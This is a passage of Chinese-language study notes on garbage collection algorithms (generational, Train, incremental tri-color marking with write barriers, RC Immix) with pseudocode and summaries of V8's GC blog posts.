ambiguous_data;\n\n评估优点\n实现容易：编写程序设计语言的处理程序（编译器，解释器）可以花比较少的时间在GC上。\n\n缺点\n识别指针和非指针需要付出成本：需要消耗计算机资源来识别不明确的根和数据结构的值为“指针”还是“非指针”。\n错误识别指针会压迫堆：当识别错误时会降低堆空间利用率，不断挤压蚕食堆空间。\nGC算法的选择有限制：基本上不能使用 GC 复制算法等移动对象的 GC 算法。因为如果将对象移动到新空间，被错误识别成指针的数据也会被修改为新的值（此时该值为新对象的地址）。\n\n总之缺点大于优点，建议使用准确式GC来作为GC模式。\n准确式GC准确式 GC（Exact GC）和保守式 GC 正好相反，它是能正确识别指针和非指针的 GC。创建正确的根的方法有很多种，不过这些方法有个共通点，就是需要“语言处理程序的支援”，所以正确的根的创建方法是依赖于语言处理程序的实现的。下面是几种比较常用的方法。\n\n打标签：一个例子是在低一位打标签。v8就是这么干的。做法是把非指针（int等）向左移动 1 位（a &lt;&lt; 1），将低 1 位置位（指针设置为1，数据不用动）。移位要注意不要让数据溢出。处理数据时先将其右移移位进行运算，等到操作完成该数据后再将其左移回去。基本上打标签和取消标签的操作都是由语言处理程序执行的。\n\n不把寄存器和栈等当作根：前提条件是创建一个正确的根，这个正确的根在处理程序里只集合了 mutator可能到达的指针，然后以它为基础来执行 GC。Example，当语言处理程序采用 VM（虚拟机）这种构造时，有时会将 VM 里的调用栈和寄存器当作正确的根来使用。\n\n\n【优点】保守式GC的缺点在这里都得到了解决。\n【缺点】同样保守式的优点也是它的缺点，也就是实现困难。\n【缺点】打标签的方式可能会影响程序整体的运行速度。\n优化措施间接引用解决的是GC算法的选择有限制的问题，使用该技术就可以使用GC复制算法了。间接引用实际上就是加了一个中间层。由于加了一个中间层，当对象移动时，中间层的值进行了修改，而根始终指向中间层，根的值并没有做任何更改。\n【优点】可以使用类似于GC复制算法等移动对象的算法了，可选择性多了。\n【缺点】因为必须将所有对象都（经由句柄）间接引用，所以会拉低访问对象内数据的速度，这会关系到整个语言处理程序的速度。\n\nMostlyCopyingGC概念这是1989 年 诞生的一个保守式 GC 复制算法。这个算法能在不明确的根的环境中运行 GC 复制算法。堆被分成若干个一定大小的页。页有三种形式。如下图：\n\nOBJECT表示正在使用的页，CONTINUED表示当正在使用的页跨页时将被设置在第2个页之后，没有标志的表示空白页。\n默认一个新的堆中全部是空白页，申请小对象基本只会分配在已有的OBJECT页或者新建的OBJECT页；而申请大对象基本会新建OBJECT页和CONTINUED页。\n分配过程如果正在使用的页里有符合 mutator 申请的对象大小的chunk，对象就会被分配到这个页。\n\n如果当正在使用的页里没有大小充足的chunk时，对象就会被分配到空的页，然后正在使用的这个新页会被设置 OBJECT 标志。\n\n当 mutator 要求大对象时，分配程序会将对象跨多个页来分配。在跨多个页分配时，和平时的分配一样，也会在开头的页设定OBJECT，然后在第 2 个页之后设置 CONTINUED 标志。\n\nGC过程初始状态，这里的$current_space是From页的编号，$next_space是To页的编号，此时二者相同。\n\n将从根引用的对象的页“晋升”（promotion）到 To 页，此时$next_space发生了改变，目的是为了区分标记From页和To页。\n\n接着还是按照由根到堆的顺序将From页的活动对象复制到To页。\n\n\n将 To 页里的所有子对象复制完毕后，GC 就结束了。这时程序会将 $current_space 的值设定为 $next_space 的值。\n\n不过此时垃圾对象 X、Y、D 都没有被回收（因为Y不能被任何指针索引到，而D由Y索引，所以二者都是垃圾对象）。实际上这就是 MostlyCopyingGC的特殊之处。它不会回收包含有从根指向的对象（图中的 A）的页里的垃圾对象，而且也不会回收这个垃圾对象所引用的对象群。举个极端的例子，如果所有的页里都有从根引用的对象，那么所有的垃圾都不能被回收。\n这个缺点可以通过调整页大小得到改善。如果缩小页，那么即使页里的对象是从根引用的，我们也能把损失降到最低。不过如果页太小了，就会增加页总数，增大分配和 GC 所需要的成本。所以将页调整到合适大小是非常关键的。据文献 [17] 记载，有试验结果表明页的合适大小在 512 字节。\n【优点】能在保守式 GC 里使用 GC 复制算法。兼顾了保守式GC（实现简单）和GC复制算法的优点。\n【缺点】也同样由GC复制算法的缺点，还有一个特有缺点是在包含有从根引用的对象的页内，所有的对象都会被看成活动对象。也就是说，垃圾对象也会被看成活动对象，这样一来就拉低了内存的使用效率。\n黑名单处理的是错误识别指针会压迫堆的问题，通过黑名单标记可能存在问题的内存，减小其带来的危害（但不能消除）。\n在指针的错误识别中，当被错误判断为活动对象的那些垃圾对象的大小过大以及子对象过多时，造成的危害会相对来说比较大。而当其垃圾对象的大小比较小而且该对象没有子对象时，造成的危害会比较小。\n基于这一点，黑名单就是一种创建“需要注意的地址的名单”的方法。这个黑名单里记录的是“不明确的根内的非指针，其指向的是有可能被分配对象的地址”。我们将这项记录操作称为“记入黑名单”。黑名单里记录的是“需要注意的地址”。一旦分配程序把对象分配到这些需要注意的地址中，这个对象就很可能被非指针值所引用。也就是说，即使分配后对象成了垃圾，也很有可能被错误识别成“它还活着”。所以我们在黑名单中的内存可以分配上述提到的大小比较小且没有子对象的对象，这样为如果这样的对象成了垃圾，即使被错误识别了，也不会有什么大的损失。说白了就是风险最小化。\n【优点】可以缓解错误识别指针会压迫堆的问题。堆的使用效率页得到了提升。\n【缺点】分配对象时需要检查黑名单，需要花费一定的时间。\n无法判断该技术是否好用，具体是否应用该技术取决于工程实际测试时表现的性能。\n分代垃圾回收（Generational GC）定义分代垃圾回收中把对象分类成几代，针对不同的代使用不同的 GC 算法，我们把刚生成的对象称为新生代对象，到达一定年龄的对象则称为老年代对象。我们将对新对象执行的 GC 称为新生代 GC（minor GC）。将面向老年代对象的 GC 称为老年代 GC（major GC）。\n分代垃圾回收，基于的是“大部分的对象，在生成后马上就会变成垃圾”这一经验上的事实为设计出发点。\n实现这里介绍下Ungar的分代垃圾回收，它是由 David Ungar 研究出来的把 GC 复制算法和分代垃圾回收这两者组合运用的方法。\n堆结构如下。两个幸存空间可以分成From幸存空间和To幸存空间，生成空间和From幸存空间都会使用类似于GC复制算法将活动对象拷贝到To空间，之后进行From幸存空间和To幸存空间的swap。可能会出现To幸存空间可能不能承载所有活动对象的任务（这种情况可能比较少，因为新生代对象的定义就是生命比较短的对象），这时就会临时将老年代空间当作承载容器。只有达到一定年龄的对象才会被移动到老年代空间中。老年代空间满了之后会执行GC标记-清除算法。这时可能会出现老年代对象指向新生代对象的情况。\n\n对于新生代对象的索引有三种情况：根索引、新生代对象索引、老年代对象索引。分代垃圾回收的优点是只将垃圾回收的重点放在新生代对象身上，以此来缩减 GC 所需要的时间。不过考虑到从老年代对象的引用，结果还是要搜索老年代堆中的所有对象，这样一来就大大削减了分代垃圾回收的优势。这时我们可以维护一个列表来维护从老年代指向新生代的对象，这个列表就叫做记录集。写入记录集之前会判断该对象是否在老年代且指向的对象是否在新生代，该对象是否没有保存在记录集中（通过标志位remembered来判断），如果都满足条件则将该对象的索引写入记录集中。\n// write_barrier：写入记录集。write_barrier(obj, field, new_obj)&#123; if(obj &gt;= $old_start &amp;&amp; new_obj &lt; $old_start &amp;&amp; obj.remembered == FALSE) $rs[$rs_index] = obj $rs_index++ obj.remembered = TRUE      *field = new_obj&#125;\n\n对象头包含了很多东西，有常规的对象的种类和大小，还有\n\n对象的年龄（age）：只在新生代对象头，如果年龄到达阈值则进入老年代。\n对象是否已经被复制过（forwarded）：只在新生代对象头，防止复制相同对象。\n是否被记录集记录（remembered）：只再老年代对象头，防止重复再记录集记录。\n\n对象还有个forwarding指针，obj.forwarding，指向了要复制的空间。\n// new_obj：主要逻辑就是复制内存，移动指针。和GC复制算法很像。new_obj(size)&#123; if($new_free + size &gt;= $survivor1_start) minor_gc() if($new_free + size &gt;= $survivor1_start) allocation_fail() obj = $new_free $new_free += size obj.age = 0 obj.forwarded = FALSE obj.remembered = FALSE obj.size = size return obj&#125;// copy：根据对象的年龄来决定将对象复制到新生代空间还是老年代空间。copy(obj)&#123; if(obj.forwarded == FALSE) if(obj.age &lt; AGE_MAX) copy_data($to_survivor_free, obj, obj.size) obj.forwarded = TRUE obj.forwarding = $to_survivor_free $to_survivor_free.age++ $to_survivor_free += obj.size for(child : children(obj)) *child = copy(*child) else promote(obj)      return obj.forwarding&#125;// promote：年龄到达指定大小即可今生至老年代，之后判断该对象指向的对象是否在新生代，若是则将其地址存放在记录集中。promote(obj)&#123; new_obj = allocate_in_old(obj) if(new_obj == NULL) major_gc() new_obj = allocate_in_old(obj) if(new_obj == NULL) allocation_fail() obj.forwarding = new_obj obj.forwarded = TRUE      for(child : children(new_obj)) if(*child &lt; $old_start) $rs[$rs_index] = new_obj $rs_index++ new_obj.remembered = TRUE return&#125;// minor_gc：新生代GC，上半部分通过根遍历所有新生代对象进行复制，下半部分遍历记录集来复制来自老年代指针指向的新生代对象。minor_gc()&#123; $to_survivor_free = $to_survivor_start for(r : $roots) if(*r &lt; $old_start) *r = copy(*r)      i = 0 while(i &lt; $rs_index) has_new_obj = FALSE for(child : children($rs[i])) if(*child &lt; $old_start) *child = copy(*child) if(*child &lt; $old_start) has_new_obj = TRUE if(has_new_obj == FALSE) $rs[i].remembered = FALSE $rs_index-- swap($rs[i], $rs[$rs_index]) else i++      swap($from_survivor_start, $to_survivor_start)&#125;\n\n评估优点\n提高了吞吐量：基于“很多对象年纪轻轻就会死”的理论。通过分代的方式快速处理了大部分对象，而难以变为垃圾的老年代对象也没有必要频繁的进行GC访问。\n\n缺点\n可能起反作用：虽然“很多对象年纪轻轻就会死”毕竟只适合大部分那情况，并不适用于所有程序。当那少部分的程序使用分代的方式处理时不仅新生代GC花费的时间会增多，老年代的GC也会频繁运行，写入记录集的操作也会降低吞吐量。\n最大暂停时间问题：老年代使用了GC标记-清除算法，对于最大暂停时间有影响。\n跨代的循环引用无法一次性回收：只有等新生代的对象年龄到了放在老年代才能得到处理。\n记录集比较占用空间：每有一个老年代指向新生代的对象，就会占用一个字存放在记录集中。\n\n优化措施记录各代之间的引用的方法解决的是记录集比较占用空间的问题，可以通过两种方式。\n一是将老年代内存分为一节节的小内存，每节小内存如果有对象指向新生代空间，那么该节的标志位置为1 。但是当老年代对象比较多的时候，搜索每节内存都要花费大量时间。\n二是通过操作系统的页面管理程序，很多操作系统都是以页面为单位来管理内存空间的。因此如果在卡片标记中将卡片和页面设置为同样大小，我们就能得到 OS 的帮助。实际上利用的也是第一点提到的思路，只不过有操作系统协助管理。但是这个方法只适用于能利用页面重写标志位或能利用内存保护功能的环境。而且不只搜索老年代到新生代会进行索引，老年代对老年代进行索引操作系统也会进行标记。\n多代垃圾回收它是为了解决最大暂停时间问题。分代垃圾回收将对象分为新生代和老年代，通过尽量减少从新生代晋升到老年代的对象，来减少在老年代对象上消耗的垃圾回收的时间。\n但是如果代数太多，各代之间的引用就会变得更复杂，每代的空间也就越小，各代GC花费的时间也越长了。\n\nTrain GC该方法是为了解决跨代的循环引用无法一次性回收和最大暂停时间问题。\n\nTrain GC的特点有\n\n引入了“列车”与“车厢”的概念，GC的对象是第一个列车的第一个车厢。\n新生代对象不在分为生成空间、2 个大小相等的幸存空间这三块空间了，而是仅仅只有一块新生代空间，毕竟To空间放在老年代空间里面了。\n记录集有多个，并且是单向的（因为GC的对象仅仅在第一个列车里面）。新生代、列车、车厢都有记录集。\n\n新生代GC将被引用的新生代对象复制到引用它的老年代对象的车厢中，并把根引用的新生代对象放入新的车厢中\n\n// copy：将新生代对象复制到老年代的车厢中。copy(obj, to_car)&#123; if(obj.forwarded == FALSE)     if(to_car.free + obj.size &gt;= to_car.start + CAR_SIZE)    \t to_car = new_car(to_car)     copy_data(to_car.free, obj, obj.size)     obj.forwarding = to_car.free     obj.forwarded = TRUE     to_car.free += obj.size     for(child : children(obj.forwarding))     \t*child = copy(*child, to_car)      return obj.forwarding&#125;// minor_gc：将具有引用关系的对象被安排到了同一辆列车里，如果空间不够则安排到新车厢中。minor_gc()&#123; to_car = new_car(NULL) for(r : $roots) if(*r &lt; $old_start) *r = copy(*r, to_car)      for(remembered_obj : $young_rs) for(child : children(*remembered_obj)) if(*child &lt; $old_start) to_car = get_last_car(obj_to_car(*remembered_obj))\t\t// 该行将具有引用关系的对象被安排到了同一辆列车里。这方便在老年代GC的时候回收整个车厢。 *child = copy(*child, to_car)&#125;\n\n而正常的老年代GC流程则是按照搜索第一个列车-&gt;第一节车厢的顺序清空第一个车厢的活动对象并进行垃圾回收。先把列车一被其他列车引用的对象复制到其他列车中，如图7.14。之后再将1.1车厢被列车一其他车厢引用的对象复制出去，这样车厢一的活动对象就已经被清空了。\n\n而当列车一没有其他列车引用其中的对象时，可以将列车一这个列车一并回收。\n\n【优点】可以减少最大暂停时间，因为每次进行GC的只是一节车厢，只占堆中比较小的一部分。\n【优点】可以回收循环垃圾，毕竟通过列车的记录集就可以知道这个列车是不是孤儿，如果是则将整个列车回收。\n【缺点】因为记录集变多了，所以吞吐量更低了，占用的空间也相应的增加。\n【缺点】如果对象大小大于一个车厢，该算法就不能对他进行处理，需要安排到新生代和老年代以外的堆进行回收。\n增量式垃圾回收（Incremental GC）定义如果当GC执行的时间过长导致这段时间mutator完全不能工作，那么就将这种GC叫做停止型GC。根据mutator的用途不同，有时候停止型GC是非常要命的。因此我们可以采用慢慢发生变化的方式进行GC，这种方式叫做增量式垃圾回收。停止型GC和增量式垃圾回收图如下。\n\n\n描述增量式垃圾回收的算法可以方便的使用三色标记算法（Tri-color marking）。\n\n白色：还未搜索过的对象\n灰色：正在搜索的对象\n黑色：搜索完成的对象\n\n以 GC 标记 - 清除算法为例：\n\n根查找阶段：GC 开始运行前所有的对象都是白色。GC 一开始运行，所有从根直接到达的对象都会被放到栈里并被标记为灰色。\n标记阶段：灰色对象会被依次从栈中取出，其子对象也会被涂成灰色。当其所有的子对象都被涂成灰色时，对象就会被涂成黑色。\n清除阶段：当 GC 结束时已经不存在灰色对象了，活动对象全部为黑色，垃圾则为白色。这时将白色对象全部回收。\n\n三色标记算法这个概念不仅能应用于 GC标记 - 清除算法，还能应用于其他所有搜索型 GC 算法。这里面有个数据结构存放要遍历标记的对象叫做标记栈，标记栈里面存放的一定是灰色对象，代表里面的对象需要进行处理。而从标记栈中出来的对象则会被涂成黑色，代表处理完毕并且它是个活动对象。\n\n实现// incremental_gc：增量式垃圾回收。分为三个阶段——根查找阶段、标记阶段、清除阶段。incremental_gc()&#123; case $gc_phase when GC_ROOT_SCAN root_scan_phase() when GC_MARK incremental_mark_phase() else incremental_sweep_phase()&#125;// root_scan_phase：根查找阶段将根直接引用的对象标灰。也就是将其放入标记栈中。root_scan_phase()&#123; for(r : $roots) mark(*r) $gc_phase = GC_MARK&#125;mark(obj)&#123; if(obj.mark == FALSE) obj.mark = TRUE push(obj, $mark_stack)&#125;// incremental_mark_phase：增量标记阶段，此时标记栈中是根直接索引的对象，增量标记阶段则将这些根直接索引的对象继续遍历，将栈中每个元素直接引用的对象标灰并压入标记栈中，然后将该元素自己标为黑色。当然是有次数限制的：为MARK_MAX，要不也不能叫做增量式垃圾回收了，毕竟要一块一块的进行操作。达到为MARK_MAX限制时会暂停标记阶段，之后执行mutator保证进程的暂停时间不至于过长。可以看出这里的搜索方式是部分深度优先搜索，根查找阶段是广搜，增量标记阶段是深搜（因为采取了栈结构，后进入的对象先处理）。incremental_mark_phase()&#123; for(i : 1..MARK_MAX) if(is_empty($mark_stack) == FALSE)\t obj = pop($mark_stack)     for(child : children(obj))         mark(*child)     else         for(r : $roots)            mark(*r) while(is_empty($mark_stack) == FALSE)     obj = pop($mark_stack)     for(child : children(obj))    \t mark(*child)      $gc_phase = GC_SWEEP $sweeping = $heap_start return&#125;// incremental_sweep_phase：增量清除阶段，执行了SWEEP_MAX次，遍历整个堆空间，白色的对象一定为垃圾对象，所以要将其回收。黑色的对象则为活动对象，将其涂成白色方便下一次的标记阶段。incremental_sweep_phase()&#123; swept_count = 0 while(swept_count &lt; SWEEP_MAX) if($sweeping &lt; $heap_end) if($sweeping.mark == TRUE) $sweeping.mark = FALSE else $sweeping.next = $free_list $free_list = $sweeping $free_size += $sweeping.size $sweeping += $sweeping.size swept_count++ else $gc_phase = GC_ROOT_SCAN return&#125;// newobj：分配新对象的过程，还是和之前区别不大，这里需要注意的一点就是清除阶段是分段进行的，这样就将堆分为两块空间。分别是已清除完毕的空间和尚未清除完毕的空间，将内存分配在在以清除完毕的空间中不需要做任何事，清除代码也不会处理那块空间，但是如果将内存分配在尚未清除完毕的空间，那么清除程序后续会执行到这里，就需要将这个新分配的对象涂黑。newobj(size)&#123; if($free_size &lt; HEAP_SIZE * GC_THRESHOLD) incremental_gc()      chunk = pickup_chunk(size, $free_list) if(chunk != NULL) chunk.size = size $free_size -= size if($gc_phase == GC_SWEEP &amp;&amp; $sweeping &lt;= chunk) chunk.mark = TRUE return chunk else allocation_fail()&#125;\n\n\n标记遗漏当进程由GC的标记阶段切换到mutator运行时，如果执行了这样一段代码\nvar C = objB.fieldC;objA.fieldB = null;  objA.fieldC = C;  objB.fieldC = null;  \n\n\n此时由B-&gt;C的引用转到了A-&gt;C的引用上。而A已经被涂黑，也就是说他不在标记栈中了，也就不会处理A了。此时如果又从mutator运行状态切换到GC的标记阶段时，本来应该继续通过mark(B)给C打上标记，但是此时C是由A索引的了。C就成孤儿了，如果C本身是个活动对象，那么由于无法对C进行涂色导致可能会释放活动对象的状况，从而导致程序异常。\n写入屏障如果新引用的对象 newobj 是白色对象，就把它涂成灰色。(迪杰斯特拉的写入屏障)\n// write_barrier：这里的mark可能表示灰色或者黑色，区分灰和黑的方式就是它是否在标记栈中，在标记栈中说明它没有被处理也就是灰色，而不在标记栈中说明已经被处理完了所以是黑色。// 这里的逻辑比较清晰，在(a)-&gt;(b)的过程中判断新空间是否被标记，如果没有标记则将其标记，也就是变为灰色，这里不用担心A和B是白色的问题。因为这里既然可以被程序引用就说明他们肯定是活动对象。write_barrier(obj, field, newobj)&#123; if(newobj.mark == FALSE) newobj.mark = TRUE push(newobj, $mark_stack) *field = newobj&#125;\n\n\n评估优点缩短最大暂停时间： GC 与 mutator 交替运行，因此不会长时间妨碍 mutator 运行。\n缺点降低了吞吐量：用到了写入屏障，增大了处理的额外负担。\n其他实现方式Steele的算法由Steele 1975年开发的算法。这个算法和上面有一点区别，这里obj.mark为True就代表它为黑色，而标记为False则代表它为灰色或者白色。区分灰色和白色的方式和上面相同，就是判断对象是否在标记栈中。\n// mark：与上面mark的区别是灰色的obj.mark值也是FALSE，而上面的obj.mark值为True。mark(obj)&#123; if(obj.mark == FALSE) push(obj, $mark_stack)&#125;// write_barrier：如果在标记过程中发出引用的对象是黑色对象，且新的引用的目标对象为灰色或白色，那么我们就把发出引用的对象涂成灰色。将A重新压栈这样之后仍然可以通过A来遍历到C。write_barrier(obj, field, newobj)&#123; if($gc_phase == GC_MARK &amp;&amp; obj.mark == TRUE &amp;&amp; newobj.mark == FALSE) obj.mark = FALSE push(obj, $mark_stack) *field = newobj&#125;\n\n\n汤浅太一的算法（Snapshot GC）1990 年汤浅太一开发，也称为“快照 GC”（Snapshot GC）。核心在于它会处理B-&gt;C的指针，即使A-&gt;C黑色对象指向白色对象也没有关系。在B-&gt;C置为null时会触发写屏障， 这时会判断C是否为白色，如果为白色将其涂灰。\n写入屏障实现方式\n// write_barrier：这个写入屏障和刚刚两个不同的地方在于它发生在取消指针的阶段（也就是B-&gt;C的阶段），前两个都是在转移指针的阶段（也就是从A-&gt;C的阶段）write_barrier(obj, field, newobj)&#123; oldobj = *field if(gc_phase == GC_MARK &amp;&amp; oldobj.mark == FALSE) oldobj.mark = TRUE push(oldobj, $mark_stack) *field = newobj&#125;// newobj：这里和前面的分配对象的实现方式有所不同，前面的分配会判断空间是在已清除完毕的空间还是尚未清除完毕的空间，已清除空间则不同处理，默认为白色，未清除空间则涂黑防止活动对象被清除阶段处理。但是在这里无条件将其涂黑，虽然之后的清楚阶段也有可能将其回收，但是仍然在一段时间内保留了垃圾对象，newobj(size)&#123; if($free_size &lt; HEAP_SIZE * GC_THRESHOLD) incremental_gc() chunk = pickup_chunk(size, $free_list) if(chunk != NULL) chunk.size = size $free_size -= size if($gc_phase == GC_MARK) chunk.mark = TRUE else if($gc_phase == GC_SWEEP &amp;&amp; $sweeping &lt;= chunk) chunk.mark = TRUE return chunk else allocation_fail()&#125;\n\n\n三种方式的比较\n\n\n提出者\nA\nB\nC\n时机\n动作\n\n\n\nDijkstra\n-\n-\n白\nA-&gt;B\n将C涂灰\n\n\nSteele\n黑\n-\n白或者黑\nA-&gt;B\n将A恢复成黑色\n\n\n汤浅\n-\n白\n-\nB-&gt;C\n将C涂灰\n\n\n这样看来，它们 3 个各不相同。实际上不仅是写入屏障，在分配等方面也存在着差异，所以我们没法简单地进行比较。不过即使存在着这么大的差异，各种写入屏障也都能顺畅运行。\nRC Immix算法定义传统的引用计数法有一大缺点，吞吐量过低。本次介绍的两种方式都会改善其吞吐量到可以实际应用的级别，但是其最大暂停时间可能会有相应的增长，毕竟没有一种算法是完美的。\n合并型引用计数法合并型引用计数法是 2001 年由 Yossi Levanoni 和 Erez Petrank 开发的算法。常规的引用计数法步骤可能会造成计数器的频繁修改，造成很大的系统开销，如下所示\n\n引用计数法在之前介绍过一个可以提高系统吞吐量的方式，叫做延迟引用计数法。从根引用的指针的变化不反映在计数器上。通过维护一个ZST表，即使频繁重写对象的引用关系也会降低系统开销。\n不过在延迟引用计数法之上还可以进行优化。考虑到图9.1的情况，通过多次变化，(a)-&gt;(b)-&gt;(c)的变化被抵消掉了。如果我们把注意力放在某一时期最初和最后的状态上，在此期间不进行计数器的增减，这样就可以减少很多无效的计算。这种方式就叫做合并型引用计数法。将指针的改动信息注册到更改缓冲区（Modified Buffer）。大致的过程如下图，(e)步骤实际上A的引用计数经过处理后应该变为1，而B则变为2 。\n\n我们将指针改动了的 X 和指针改动前被 X 引用的 A 注册到了更改缓冲区。结束时X指向了B。之后对B的计数器加一，对A的计数器减一。\n// garbage_collect：先进行加法再进行减法的目的是和之前一样，为了确保A和B是同一对象的情况也能顺利运行。garbage_collect()&#123; foreach(entry : $mod_buf) obj = entry.obj foreach(child : obj) inc_ref_cnt(child) foreach(child : entry.children) dec_ref_cnt(child) obj.dirty = false clear($mod_buf)&#125;// write_barrier_coalesced_RC：写入屏障的作用就是确保对象进入更改缓冲区（Modified Buffer）// register：注册函数是将指针改动了的 X 和指针改动前被 X 引用的 A 注册到了更改缓冲区。（X和N同上面的例子）write_barrier_coalesced_RC(obj, field, dst)&#123; if(!obj.dirty) register(obj) obj.field = dst&#125;register(obj)&#123; if($mod_buf.size &lt;= $mod_buf.used_size) garbage_collect() entry.obj = obj foreach(child_ptr : children(obj)) if(*child_ptr != null) push(entry.children, *child_ptr) push($mod_buf, entry) obj.dirty = true&#125;\n\n【优点】增加了吞吐量。它不是逐次进行计数器的增减处理，而是在某种程度上一并执行，所以能无视增量和减量相抵消的部分。\n【缺点】是增加了 mutator 的暂停时间，这是因为在查找更改缓冲区的过程中需要让mutator 暂停。当然，如果更改缓冲区的大小比较小，就能相应缩短暂停时间，不过这种情况下就没法指望增加吞吐量。这方面需要我们加以权衡好好调整。\nRC Immix（合并型引用计数法和Immix的融合）在以往的合并型引用计数法中，通过查找更改缓冲区，计数器值为 0 的对象会被连接到空闲链表，为之后的分配做准备。这和单纯的引用计数法是一样的。\nImmix 中不是以对象为单位，而是以线为单位进行内存管理的，因此不使用空闲链表。如果线内一个活动对象都没有了，就回收整个线。只要线内还有一个活动对象，这个线就无法作为chunk回收。RC Immix 中不仅对象有计数器，线也有计数器，这样就可以获悉线内是否存在活动对象。不过线的计数器和对象的计数器略有不同。对象的计数器表示的是指向这个对象的引用的数量，而线的计数器表示的是这个线里存在的活动对象的数量。如果这个数变成了 0，就要将线整个回收。下图表示的是线的计数器。\n\n为了减少额外负担，线的计数器里记录的不是“指向线内对象的引用的数量”，而是“线内活动对象的数量”。对象生成和废弃的频率要低于对象间引用关系变化的频率，这样一来更新计数器所产生的额外负担就小了。\n// 这里的线包含了所有活动对象，当某个对象的计数器减为0时，线的计数器减一（因为线包含的是活动对象的数量）；当线的计数器减为0时回收整个线。// 可能出现这种情况，一个线中只有一个对象，而该对象的引用计数为3。那么线的计数为1&lt;对象的引用计数3。dec_ref_cnt(obj)&#123; obj.ref_cnt-- if(obj.ref_cnt == 0) reclaim_obj(obj) line = get_line(obj) line.ref_cnt-- if(line.ref_cnt == 0) reclaim_line(line)&#125;\n\n但是这样处理可能会有内存碎片，RC Immix算法提供了两种方式进行压缩。\n被动碎片整理（Reactive  Defragmentation）：RC Immix 和合并型引用计数法一样，在更改缓冲区满了的时候都会查找更改缓冲区，这时如果发现了新对象，就会把它复制到别的空间去。这里使用的是Cheney的GC复制算法（遍历的方式进行GC复制算法）。简单来说：更改缓冲区里存放的都是新对象（没有经历过 GC 的对象称为新对象，新对象是在上一次 GC 之后生成的。因此指向新对象的所有指针也是在上一次 GC 之后生成的。更改缓冲区里记录的是从上一次 GC 开始到现在为止指针改动过的对象。所有指向新对象的指针都是在上一次 GC 之后生成的。也就是说，所有引用新对象的对象都被注册到了更改缓冲区。），RC Immix 中以新对象为对象进行压缩。不过被动的碎片整理只会对活动对象中的新对象进行压缩。这样随着程序的逐步运行，旧对象可能会导致碎片化。此外，因为我们是以引用计数法为基础的，所以不能回收循环垃圾。为了解决如上问题，在 RC Immix 里还要进行一项压缩，那就是积极的碎片整理。\n积极的碎片整理（Proactive Defragmentation）：上面说被动的碎片整理有两个缺点。一是无法对旧对象进行压缩，二是无法回收有循环引用的垃圾。通过GC标记-压缩算法可以有效的解决这个问题。不过这个碎片整理应该被当作辅助碎片整理来用，毕竟这会增大最大暂停时间。当chunk的总大小下降到一定值（例如全体堆的 10%）时再执行它为好。\n【优点】吞吐量提高的比较明显。据论文记载，与以往的引用计数法相比，其吞吐量平均提升了 12%。根据基准测试程序的情况，甚至会超过搜索型 GC。吞吐量得到改善的原因有两个。其一是导入了合并型引用计数法。因为没有通过写入屏障来执行计数器的增减操作，所以即使对象间的引用关系频繁发生变化，吞吐量也不会下降太多。另一个原因是撤除了空闲链表。通过以线为单位来管理chunk，只要在线内移动指针就可以进行分配了。此外，这里还省去了把chunk重新连接到空闲链表的处理。\n【缺点】RC Immix 和合并型引用计数法一样，都会增加暂停时间。不过如前所述，可以通过调整更改缓冲区的大小来缩短暂停时间。另一个缺点是“只要线内还有一个非垃圾对象，就无法将其回收”。在线的计数器是 1，也就是说线内还有一个活动对象的情况下，会白白消耗大部分线。\n总结有过C或C++开发经验的童靴都知道，C/C++的动态内存（一般是堆内存）是通过malloc等函数手动申请，并交由Free等函数手动释放的，这就需要我们对我们申请的每一块内存负责。如果无限申请资源而不去使用并释放，那么堆内存将会被分配至耗尽浪费系统资源并产生性能问题。如果释放的时候并没有回收空间或者回收多次，或者指向空间的指针没有被置空，那么就可能会出现安全漏洞。\nGC提供了这样一种机制，开发者无需关注这种动态内存的释放问题，具体的实现是通过程序设计语言处理引擎（比如v8）来管理无用对象的垃圾回收，从而大大减少了出bug或者安全漏洞的几率。\n主流的GC算法分为两类，分别是搜索型算法和引用计数法，GC标记-清除算法与GC复制算法等等都需要搜索根，所以他们都属于搜索型算法。而引用计数法独树一帜，当计数为0时可以直接将其清除掉。\n实现篇v8v8官方博客free-garbage-collection发布时间 2015-08-07\n这里翻译有一些错误，应该翻译为空闲时垃圾回收，作者举的例子为在播放60 帧动画时仍存在idle period，可以利用这段空闲时间进行垃圾回收。\n\n这里使用的垃圾回收思想为分代垃圾回收，新生代使用GC复制算法，而老年代为GC标记-清除算法，不压缩的好处是可以节省一些压缩的时间，坏处还是内存碎片化，分配空间困难等问题。\njank-busters发布时间 2015-10-30\n实际上是对最大暂停时间的避免，主要采用了下面几种方式\n\n之前在分配大量ArrayBuffer 的场景下（例如基于WebGL的应用，WebGL是一个基于JS的3D绘图协议）对这些缓冲区的GC会使最大暂停时间不可避免的变长。此时采取的方式是在每次使用ArrayBuffer 时进行检查来判断是否使用，如果未使用则将其空间释放，这样是将统一处理折衷成了分散处理，每次使用缓冲区都要进行检查可能会影响性能。\n众所周知v8与BLINK有各自的堆空间存放活动对象，当BLINK使用v8对象时，v8需要维护一个状态表去表示那些BLINK区引用的对象，使v8在GC时不去回收这些对象。还是像之前的场景一样，对于WebGL这种会产生大量缓冲区的协议，就需要维护大量这样的全局引用来管理其生命周期。幸运的是，传递给 WebGL 的对象通常只是传递而从未真正修改过，从而可以进行简单的逃逸分析。使用小数组作为参数的 WebGL 函数，可将这个参数数据复制到栈上，减缓GC压力。\n通过并发线程共同处理GC过程。主要清理老年代（新生代的GC复制算法效率很高最大暂停时间很短）。\n\njank-busters-two：orinoco发布时间 2016-04-12\nv8团队新命名了代号为Orinoco 的垃圾回收器，Orinoco 基于这样的想法，即在没有严格的分代边界的情况下实现大部分并行和并发的垃圾回收器将减少垃圾回收的 jank 和内存消耗，同时提供高吞吐量。此次的博客主要的性能提升体现在以下三个方面。\n\n新生代的晋升与老年代的压缩之间没有依赖关系，因此 Orinoco 可以并行执行这些阶段。\nGC复制算法以及压缩过程等都涉及到对象的移动，对象移动的过程中需要更新指向该对象的指针。之前的做法是新生代和每个老年代都维护一个指向该区域的指针列表，但是这样可能会有重复条目的指针，这样多线程操作的时候可能会导致数据争用。改进的方式是对堆空间维护一个标志位区域。指向其他空间的指针位置在其标志位对应处置1，代表该位置有指向其他区域的指针。\n将老年代中分配的所有对象涂黑，这样GC的整个过程都不会操作他们。因为老年代的含义就是比较稳定的对象，所以这个逻辑并没有什么问题。而最终在合适的时机进行老年代对象的垃圾回收。\n\nOrinoco：新生代垃圾回收发布时间 2017-11-29\n新生代的垃圾回收方式一般为GC复制算法，但是在多线程环境中对GC复制算法的实现是一个问题。\nV8 将其托管堆（managed heap）分成几代，其中对象最初在新生代（young 